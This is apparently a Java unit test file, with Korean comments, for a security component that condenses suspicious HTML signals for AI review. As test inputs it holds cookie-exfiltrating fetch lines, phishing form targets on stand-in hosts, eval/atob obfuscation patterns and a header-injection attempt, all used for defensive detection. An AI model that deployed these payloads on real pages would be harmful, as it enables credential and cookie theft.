package com.workplace.fileai.security;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;

/** 스크립트 요지(WP-1262) — AI 에 넘길 위험 신호만 섹션별로 모으고 길이를 묶는다. */
class ScriptDigestTest {

  /** 인라인 스크립트 본문은 그대로 실린다. */
  @Test
  void build_whenInlineScript_includesBody() {
    var r = ScriptDigest.build("<html><script>fetch('/steal?c='+document.cookie)</script></html>");
    assertThat(r.text()).contains("[스크립트]").contains("fetch('/steal?c='+document.cookie)");
    assertThat(r.truncated()).isFalse();
  }

  /** 외부 스크립트는 주소만 싣고 「코드를 불러와 실행」 바깥 주소에도 오른다. */
  @Test
  void build_whenExternalScript_includesOnlyAddress() {
    var r = ScriptDigest.build("<script src=\"https://cdn.example/a.js\"></script>");
    assertThat(section(r.text(), "[바깥 주소 — 코드를 불러와 실행]"))
        .contains("<script> https://cdn.example/a.js");
  }

  /** 인라인 이벤트 속성 값이 실린다. */
  @Test
  void build_whenEventAttribute_includesValue() {
    var r = ScriptDigest.build("<button onclick=\"doEvil(1)\">x</button>");
    assertThat(r.text()).contains("[이벤트 속성]").contains("onclick").contains("doEvil(1)");
  }

  /** javascript: 주소가 실린다. */
  @Test
  void build_whenJavascriptHref_includesIt() {
    var r = ScriptDigest.build("<a href=\"javascript:go()\">x</a>");
    assertThat(r.text()).contains("[javascript: 주소]").contains("javascript:go()");
  }

  /** 폼 action 과 입력의 type·name 이 실린다. */
  @Test
  void build_whenCredentialForm_includesActionTypeName() {
    var r =
        ScriptDigest.build(
            "<form action=\"https://evil.example/login\"><input type=\"password\" name=\"pw\"></form>");
    assertThat(r.text())
        .contains("[폼·입력]")
        .contains("https://evil.example/login")
        .contains("password")
        .contains("pw");
  }

  /** iframe 주소와 meta refresh 이동이 실린다. */
  @Test
  void build_whenFrameAndRefresh_includesBoth() {
    var r =
        ScriptDigest.build(
            "<meta http-equiv=\"refresh\" content=\"0;url=https://go.example/x\">"
                + "<iframe src=\"https://frame.example/p\"></iframe>");
    assertThat(r.text())
        .contains("[프레임·이동]")
        .contains("https://frame.example/p")
        .contains("0;url=https://go.example/x");
  }

  /** data: URI 는 앞 64자 + … 만 남는다(1MB 이미지가 요지를 채우지 않게). */
  @Test
  void build_whenHugeDataUri_keepsOnly64Chars() {
    String prefix = "data:image/png;base64,";
    String uri = prefix + "A".repeat(1024 * 1024);
    var r = ScriptDigest.build("<script>x()</script><img src=\"" + uri + "\">");
    String kept = uri.substring(0, 64) + "…";
    assertThat(r.text()).contains(kept).doesNotContain(uri.substring(0, 65)).hasSizeLessThan(2_000);
  }

  /** data: URI 를 쓰는 외부 스크립트도 64자로 자른다. */
  @Test
  void build_whenDataUriScriptSrc_trims() {
    String uri = "data:text/javascript;base64," + "B".repeat(10_000);
    var r = ScriptDigest.build("<script src=\"" + uri + "\"></script>");
    assertThat(r.text()).contains(uri.substring(0, 64) + "…").doesNotContain(uri.substring(0, 65));
  }

  /** 스크립트가 길면 앞 40,000자 + 중략 + 뒤 20,000자로 줄이고 truncated 를 켠다. */
  @Test
  void build_whenOverLimit_truncatesHeadAndTail() {
    String body = "h".repeat(50_000) + "t".repeat(50_000);
    var r = ScriptDigest.build("<script>" + body + "</script>");
    assertThat(r.truncated()).isTrue();
    assertThat(r.text()).contains("\n…(중략)…\n");
    assertThat(r.text().length()).isLessThanOrEqualTo(60_000 + "\n…(중략)…\n".length());
    assertThat(r.text()).startsWith("[스크립트]").endsWith("t");
  }

  /** 바깥 주소 목록은 중복을 뺀다. */
  @Test
  void build_whenRepeatedExternal_deduplicates() {
    var r =
        ScriptDigest.build(
            "<script src=\"https://cdn.example/a.js\"></script>"
                + "<script src=\"https://cdn.example/a.js\"></script>"
                + "<img src=\"https://img.example/p.png\">");
    assertThat(section(r.text(), "[바깥 주소 — 코드를 불러와 실행]").split("https://cdn.example/a.js", -1))
        .hasSize(2);
    assertThat(r.text()).contains("<img> https://img.example/p.png");
  }

  /** 스타일·글꼴·이미지는 실행되지 않는 표시 자원으로, 다른 rel 의 link 는 코드로 나눈다(WP-1283). */
  @Test
  void build_whenStylesheetAndImage_listsAsResource() {
    var r =
        ScriptDigest.build(
            "<link rel=\"stylesheet\" href=\"https://cdn.example/font.css\">"
                + "<link rel=\"modulepreload\" href=\"https://cdn.example/m.js\">"
                + "<img src=\"https://img.example/p.png\">");
    String resource = section(r.text(), "[바깥 주소 — 표시 자원(CSS·글꼴·이미지, 실행 안 됨)]");
    assertThat(resource)
        .contains("<link rel=stylesheet> https://cdn.example/font.css")
        .contains("<img> https://img.example/p.png")
        .doesNotContain("m.js");
    assertThat(section(r.text(), "[바깥 주소 — 코드를 불러와 실행]"))
        .contains("<link rel=modulepreload> https://cdn.example/m.js");
  }

  /** 이미지의 data: 는 바깥 요청이 아니라 문서에 넣어 둔 자원이다 — data: 스크립트는 실행 쪽에 남는다(WP-1283). */
  @Test
  void build_whenDataUri_splitsEmbeddedFromExecutable() {
    var r =
        ScriptDigest.build(
            "<img src=\"data:image/png;base64,AAAA\">"
                + "<script src=\"data:text/javascript;base64,BBBB\"></script>");
    assertThat(section(r.text(), "[문서에 넣어 둔 자원(data:, 바깥 요청 없음)]"))
        .contains("<img> data:image/png;base64,AAAA")
        .doesNotContain("BBBB");
    assertThat(section(r.text(), "[바깥 주소 — 코드를 불러와 실행]"))
        .contains("<script> data:text/javascript;base64,BBBB");
  }

  /** 링크는 눌러야 이동하는 것으로 따로 싣고 target 을 함께 적는다. 바깥 form action 은 「입력을 보냄」이다(WP-1283). */
  @Test
  void build_whenLinkAndForm_marksTargetAndSend() {
    var r =
        ScriptDigest.build(
            "<a href=\"https://news.example/1\" target=\"_blank\">기사</a>"
                + "<a href=\"#s2\">다음</a>"
                + "<form action=\"https://evil.example/login\"></form>");
    assertThat(section(r.text(), "[링크 — 사용자가 눌러야 이동]"))
        .contains("https://news.example/1 (target=_blank)")
        .doesNotContain("#s2");
    assertThat(section(r.text(), "[바깥 주소 — 입력을 보냄]")).contains("https://evil.example/login");
  }

  /** 단추의 formaction 은 전송 대상, data: 링크는 링크로 싣고, 속성 값의 줄바꿈은 한 줄로 접는다(가짜 섹션 머리 차단). */
  @Test
  void build_whenFormactionDataLinkAndNewlineRel_classifiesSafely() {
    var r =
        ScriptDigest.build(
            "<form><button formaction=\"https://evil.example/steal\">go</button></form>"
                + "<a href=\"data:text/html;base64,PHNjcmlwdD4=\">열기</a>"
                + "<link rel=\"stylesheet\n\n[스크립트]\" href=\"https://x.example/a\">");
    assertThat(section(r.text(), "[바깥 주소 — 입력을 보냄]"))
        .contains("<button formaction> https://evil.example/steal");
    assertThat(section(r.text(), "[링크 — 사용자가 눌러야 이동]"))
        .contains("data:text/html;base64,PHNjcmlwdD4=");
    assertThat(r.text()).doesNotContain("stylesheet\n");
  }

  /** 회귀 표본 — 가짜 로그인: 입력을 바깥으로 보내는 인라인 fetch 와 비밀번호 칸이 요지에 남는다. */
  @Test
  void build_fakeLoginSample_keepsExfiltrationSignals() throws Exception {
    var r = ScriptDigest.build(sample("fake-login.html"));
    assertThat(r.truncated()).isFalse();
    assertThat(section(r.text(), "[스크립트]"))
        .contains("fetch('https://collect.example-phish.net/api/store'")
        .contains("document.cookie");
    assertThat(section(r.text(), "[폼·입력]")).contains("type=password name=passwd");
  }

  /** 회귀 표본 — eval 난독화: eval·atob·Function 이 요지에 남는다. */
  @Test
  void build_evalObfuscationSample_keepsObfuscation() throws Exception {
    var r = ScriptDigest.build(sample("eval-obfuscation.html"));
    assertThat(section(r.text(), "[스크립트]"))
        .contains("eval(atob(")
        .contains("new Function(String.fromCharCode(");
  }

  /**
   * 회귀 표본 — 슬라이드 문서(WP-1283 사례): 바깥 요청은 CSS 하나뿐이고 이미지는 data:, 뉴스 링크 16개는 누르는 링크로만 실린다. 실행·전송 쪽 바깥
   * 주소는 없다.
   */
  @Test
  void build_slideDeckSample_hasNoExecutableOrSendTargets() throws Exception {
    var r = ScriptDigest.build(sample("slide-deck.html"));
    assertThat(r.text()).doesNotContain("[바깥 주소 — 코드를 불러와 실행]").doesNotContain("[바깥 주소 — 입력을 보냄]");
    assertThat(section(r.text(), "[바깥 주소 — 표시 자원(CSS·글꼴·이미지, 실행 안 됨)]"))
        .contains("pretendard.min.css");
    assertThat(section(r.text(), "[문서에 넣어 둔 자원(data:, 바깥 요청 없음)]"))
        .contains("<img> data:image/png");
    assertThat(section(r.text(), "[링크 — 사용자가 눌러야 이동]").split("\\(target=_blank\\)", -1))
        .hasSize(17);
  }

  /** 요지에서 한 섹션(머리부터 다음 빈 줄까지)만 떼어 낸다 — 없으면 빈 문자열. */
  private static String section(String text, String title) {
    int start = text.indexOf(title);
    if (start < 0) return "";
    int end = text.indexOf("\n\n", start);
    return end < 0 ? text.substring(start) : text.substring(start, end);
  }

  /** 회귀 표본 HTML 을 읽는다({@code src/test/resources/fileai/security/}). */
  static String sample(String name) throws Exception {
    try (var in = ScriptDigestTest.class.getResourceAsStream("/fileai/security/" + name)) {
      return new String(in.readAllBytes(), java.nio.charset.StandardCharsets.UTF_8);
    }
  }
}
